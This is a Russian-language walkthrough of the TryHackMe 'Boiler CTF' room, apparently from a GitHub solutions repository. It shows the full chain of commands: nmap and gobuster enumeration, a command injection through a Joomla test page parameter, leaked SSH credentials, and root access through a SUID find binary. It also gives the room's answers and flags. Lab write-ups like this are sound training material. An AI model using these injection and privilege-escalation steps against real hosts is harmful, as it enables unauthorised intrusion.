[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Boiler CTF](https://tryhackme.com/r/room/boilerctf2) 

Всего 2 задания:
## Задание 1
Средний уровень CTF. Просто перечислите, и вы попадете туда.

### Ответьте на вопросы ниже
Расширение файла после анонимного входа
```commandline
nmap -sC -sV <IP>
ftp <IP>
ls -la
get .info.txt
file .info.txt 
cat .info.txt 
```
```commandline
txt
```
Что находится на самом высоком порту?
```commandline
ssh
```
Что работает на порту 10000?
```commandline
 http://<IP>:10000/
```
```commandline
webmin
```
Можете ли вы использовать службу, работающую на этом порту? (ответ «да/нет»)
```commandline
nay
```
К какой CMS вы можете получить доступ?
```commandline
gobuster dir -u http://<IP> -w /data/src/wordlists/directory-list-2.3-medium.txt 
```
```commandline
joomla
```
Продолжайте перечислять, и вы поймете, когда найдете.
```commandline
gobuster dir -u http://<IP>/joomla/ -w /data/src/wordlists/directory-list-2.3-medium.txt 
```
```commandline
Ответ не нужен
```
Интересное название файла в папке?
```commandline
http://<IP>/joomla/_test/index.php&plot=;ls -l
http://<IP>/joomla/_test/index.php&plot=;cat log.txt

username: basterd
password: superduperp@$$
```
```commandline
log.txt
```

## Задание 2
Вы можете выполнить это вручную, но делайте это по своему усмотрению.

### Ответьте на вопросы ниже
Где хранились пароли других пользователей (без расширения, только имя)?
```commandline
ssh basterd@<IP>
/bin/bash 
sudo -l
cd basterd/
ls -la
cat backup.sh
stoner : superduperp@$$no1knows
```
```commandline
backup
```
пользователь.txt
```commandline
su - stoner
whoami
ls -la
cat .secret
```
```commandline
You made it till here, well done.
```
Что вы использовали, чтобы получить статус привилегированного пользователя?
```commandline
sudo -l
find / -user root -perm -4000 -executable -type f 2>/dev/null
```
```commandline
find
```
корень.txt
```commandline
find /root -exec ls /root \;
find /root -exec cat /root/root.txt \;
```
```commandline
It wasn't that hard, was it?
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)